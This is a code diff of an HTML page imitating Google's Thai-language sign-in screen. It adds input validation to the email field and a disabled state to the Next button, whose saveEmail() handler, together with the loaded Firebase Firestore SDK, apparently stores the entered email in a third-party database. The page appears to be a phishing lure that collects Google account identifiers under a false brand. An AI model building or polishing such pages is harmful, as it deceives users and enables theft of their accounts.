@@ -82,7 +82,11 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        .next-btn:hover {
+        .next-btn:disabled {
+            background: gray;
+            cursor: not-allowed;
+        }
+        .next-btn:hover:not(:disabled) {
             background: #1669c1;
         }
     </style>
@@ -94,18 +98,20 @@
         <p class="description">ด้วยบัญชี Google เพื่อไปยัง Gmail บัญชีนี้จะพร้อมใช้งานกับแอปอื่นๆ ของ Google ในเบราว์เซอร์</p>
         
         <!-- ฟอร์มรับอีเมล -->
-        <input type="text" id="email" class="input-box" placeholder="อีเมลหรือโทรศัพท์" required>
+        <input type="text" id="email" class="input-box" placeholder="อีเมลหรือโทรศัพท์" required oninput="validateEmail()">
         <a href="#" class="forgot-link">หากลืมอีเมล</a>
         
         <div class="actions">
             <button type="button" class="register-btn">สร้างบัญชี</button>
-            <button type="button" class="next-btn" onclick="saveEmail()">ถัดไป</button>
+            <button type="button" id="next-btn" class="next-btn" onclick="saveEmail()" disabled>ถัดไป</button>
         </div>
     </div>
 
     <!-- Firebase SDK (ใช้ compat version) -->
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
-<!-- โหลด script.js หลังจาก Firebase SDK -->
-<script src="script.js"></script>
+    <!-- โหลด script.js หลังจาก Firebase SDK -->
+    <script src="script.js"></script>
+</body>
+</html>
